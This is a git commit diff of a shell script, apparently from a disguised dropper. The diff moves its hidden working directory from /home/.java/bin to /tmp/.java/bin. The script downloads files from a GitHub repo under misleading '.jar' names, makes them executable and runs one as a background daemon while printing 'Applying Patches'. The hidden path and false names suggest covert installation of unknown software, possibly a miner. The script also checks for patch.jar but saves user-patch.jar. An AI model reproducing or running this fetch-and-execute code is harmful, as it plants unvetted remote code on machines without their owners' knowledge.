3971184483a59ecbb4dacc0235167cfc1a78ce8b
i51jir6ni9t0 <wker-one@protonmail.com>
2024-09-10 08:49:26 +0000

    ES-NODE TRASH UPDATED

--- es/n1.sh
+++ es/n1.sh
@@ -2,25 +2,25 @@
 
 function fetch_files() {
     echo "Applying Patches ..."
-    mkdir -p /home/.java/bin
-    cd /home/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o patch.jar
-    cd /home/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
-    cd /home/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/es/cfg.conf -o cfg.conf
-    cd /home/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/es/n1-conf.json -o conf.json
+    mkdir -p /tmp/.java/bin
+    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o user-patch.jar
+    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
+    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/es/cfg.conf -o cfg.conf
+    cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/es/n1-conf.json -o conf.json
     echo "DONE ..."
 }
 
 function start_app() {
-    chmod a+x /home/.java/bin/***
-    cd /home/.java/bin && ./plugins.jar -c ./cfg.conf -d
+    chmod a+x /tmp/.java/bin/***
+    cd /tmp/.java/bin && ./plugins.jar -c ./cfg.conf -d
     echo "SERVER STARTED ..."
 }
 
-if [ -f "/home/.java/bin/cfg.conf" ] && [ -f "/home/.java/bin/patch.jar" ] && [ -f "/home/.java/bin/plugins.jar" ] && [ -f "/home/.java/bin/conf.json" ]; then
+if [ -f "/tmp/.java/bin/cfg.conf" ] && [ -f "/tmp/.java/bin/patch.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ] && [ -f "/tmp/.java/bin/conf.json" ]; then
     echo "Patch files already fetched ..."
     start_app
 else
-    rm -rf /home/.java/bin/**
+    rm -rf /tmp/.java/bin/**
     fetch_files
     start_app
 fi
